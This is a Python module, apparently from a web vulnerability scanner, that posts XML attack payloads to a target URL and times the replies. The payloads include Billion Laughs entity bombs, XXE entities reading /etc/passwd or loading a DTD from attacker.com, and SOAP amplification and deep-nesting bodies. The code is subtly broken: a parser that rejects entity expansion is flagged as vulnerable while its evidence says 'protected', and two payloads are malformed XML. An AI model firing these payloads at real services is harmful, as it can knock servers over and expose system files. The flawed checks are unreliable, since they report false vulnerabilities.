"""
XML Security Testing Module
XML安全测试模块 - 实体扩展/炸弹攻击检测

测试能力：
1. XML炸弹(Billion Laughs)检测
2. 外部实体注入(XXE)
3. SOAP放大攻击
4. XML拒绝服务检测
"""

import asyncio
import logging
import time
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class XMLSecurityResult:
    """XML安全测试结果"""
    vulnerable: bool
    attack_type: str  # 'billion_laughs', 'xxe', 'xml_bomb', ' amplification'
    severity: str
    evidence: str
    response_time: Optional[float] = None


class XMLSecurityTester:
    """
    XML安全测试器
    
    检测：
    1. Billion Laughs (XML炸弹) - 递归实体扩展
    2. XXE - 外部实体注入
    3. SOAP放大攻击
    4. XML DoS - 超大文档/深层嵌套
    """

    BILLION_LAUGHS_PAYLOADS = [
        ('small', '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''),
        
        ('medium', '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>'''),
    ]

    XXE_PAYLOADS = [
        ('basic_xxe', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''),
        
        ('parameter_entity', '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<foo/>'''),
        
        ('remote_xxe', '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<foo>&xxe;</foo>'''),
        
        ('ftp_xxe', '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://attacker.com/file">]>
<foo>&xxe;</foo>'''),
    ]

    SOAP_ATTACK_PAYLOADS = [
        ('soap_bomb', '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body>
    <loops>
      <repeat>500</repeat>
      <content>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</content>
    </loops>
  </soap:Body>
</soap:Envelope>'''),
        
        ('soap_recursive', '''<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    < recursive= "< recursive= "< recursive= "< recursive= "<recursive/>
  </soap:Body>
</soap:Envelope>'''),
    ]

    DEEP_NESTING_PAYLOAD = '''<?xml version="1.0"?>
%s
''' % '\n'.join([f'<level{i}><level{i+1}>' for i in range(100)] + ['<data>test</data>'] + ['</level%d>' % i for i in range(100, 0, -1)])

    def __init__(self, http_client=None):
        self.http_client = http_client
        self.results: List[XMLSecurityResult] = []

    async def test_xml_bomb(
        self,
        url: str,
        method: str = 'POST',
        timeout: float = 5.0
    ) -> List[XMLSecurityResult]:
        """
        测试XML炸弹攻击
        
        Args:
            url: 目标URL
            method: HTTP方法
            timeout: 超时时间(秒)
            
        Returns:
            测试结果列表
        """
        results = []

        for name, payload in self.BILLION_LAUGHS_PAYLOADS:
            result = await self._send_xml_with_timing(url, method, payload, 'billion_laughs', timeout)
            if result:
                results.append(result)

        return results

    async def test_xxe(
        self,
        url: str,
        method: str = 'POST',
        timeout: float = 5.0
    ) -> List[XMLSecurityResult]:
        """
        测试XXE外部实体注入
        
        Args:
            url: 目标URL
            method: HTTP方法
            timeout: 超时时间
            
        Returns:
            测试结果列表
        """
        results = []

        for name, payload in self.XXE_PAYLOADS:
            result = await self._send_xml_with_timing(url, method, payload, 'xxe', timeout)
            if result:
                results.append(result)

        return results

    async def test_soap_amplification(
        self,
        url: str,
        method: str = 'POST',
        timeout: float = 5.0
    ) -> List[XMLSecurityResult]:
        """
        测试SOAP放大攻击
        
        Args:
            url: 目标URL
            method: HTTP方法
            timeout: 超时时间
            
        Returns:
            测试结果列表
        """
        results = []

        baseline_result = await self._send_xml_with_timing(
            url, method, '<?xml version="1.0"?><root>test</root>', 'baseline', timeout
        )
        baseline_time = baseline_result.response_time if baseline_result else 0

        for name, payload in self.SOAP_ATTACK_PAYLOADS:
            result = await self._send_xml_with_timing(url, method, payload, 'soap_amplification', timeout)

            if result and baseline_time > 0:
                amplification_factor = result.response_time / baseline_time if result.response_time else 0
                
                if amplification_factor > 10:
                    result.severity = 'critical'
                    result.evidence = f'SOAP amplification detected: {amplification_factor:.1f}x response time increase'
                    results.append(result)

        return results

    async def test_deep_nesting(
        self,
        url: str,
        method: str = 'POST',
        timeout: float = 5.0
    ) -> List[XMLSecurityResult]:
        """
        测试深层嵌套DoS
        
        Args:
            url: 目标URL
            method: HTTP方法
            timeout: 超时时间
            
        Returns:
            测试结果列表
        """
        return [await self._send_xml_with_timing(
            url, method, self.DEEP_NESTING_PAYLOAD, 'deep_nesting', timeout
        )]

    async def _send_xml_with_timing(
        self,
        url: str,
        method: str,
        payload: str,
        attack_type: str,
        timeout: float
    ) -> Optional[XMLSecurityResult]:
        """发送XML并计时"""
        try:
            headers = {
                'Content-Type': 'application/xml',
                'SOAPAction': '""'
            }

            start_time = time.time()

            try:
                response = await asyncio.wait_for(
                    self.http_client.request(url, method, data=payload, headers=headers),
                    timeout=timeout
                )
                response_time = time.time() - start_time

            except asyncio.TimeoutError:
                response_time = timeout
                return XMLSecurityResult(
                    vulnerable=True,
                    attack_type=attack_type,
                    severity='critical',
                    evidence=f'Request timed out after {timeout}s - potential DoS vulnerability',
                    response_time=response_time
                )

            content = response.content or ''

            if attack_type == 'billion_laughs':
                if response.status_code == 500 or 'error' in content.lower() or 'entity' in content.lower():
                    return XMLSecurityResult(
                        vulnerable=True,
                        attack_type=attack_type,
                        severity='high',
                        evidence='XML parser rejected entity expansion (protected)',
                        response_time=response_time
                    )
                elif response_time > 1.0:
                    return XMLSecurityResult(
                        vulnerable=True,
                        attack_type=attack_type,
                        severity='critical',
                        evidence=f'Slow response ({response_time:.2f}s) - entity expansion may have occurred',
                        response_time=response_time
                    )

            elif attack_type == 'xxe':
                if any(indicator in content.lower() for indicator in ['root:', 'bin:', 'daemon:', '/etc/passwd']):
                    return XMLSecurityResult(
                        vulnerable=True,
                        attack_type=attack_type,
                        severity='critical',
                        evidence='External entity was processed - XXE vulnerability confirmed',
                        response_time=response_time
                    )
                elif response.status_code == 500 or 'xxe' in content.lower():
                    return XMLSecurityResult(
                        vulnerable=True,
                        attack_type=attack_type,
                        severity='medium',
                        evidence='XXE detected but not exploitable',
                        response_time=response_time
                    )

            return XMLSecurityResult(
                vulnerable=False,
                attack_type=attack_type,
                severity='info',
                evidence='No vulnerability detected',
                response_time=response_time
            )

        except Exception as e:
            logger.debug(f"XML security test failed ({attack_type}): {e}")
            return None

    async def test_all(self, url: str) -> List[XMLSecurityResult]:
        """运行所有XML安全测试"""
        all_results = []

        all_results.extend(await self.test_xml_bomb(url))
        all_results.extend(await self.test_xxe(url))
        all_results.extend(await self.test_soap_amplification(url))
        all_results.extend(await self.test_deep_nesting(url))

        self.results = [r for r in all_results if r is not None]
        return self.results


async def test_xml_security(url: str, http_client) -> List[XMLSecurityResult]:
    """便捷函数：测试XML安全"""
    tester = XMLSecurityTester(http_client)
    return await tester.test_all(url)
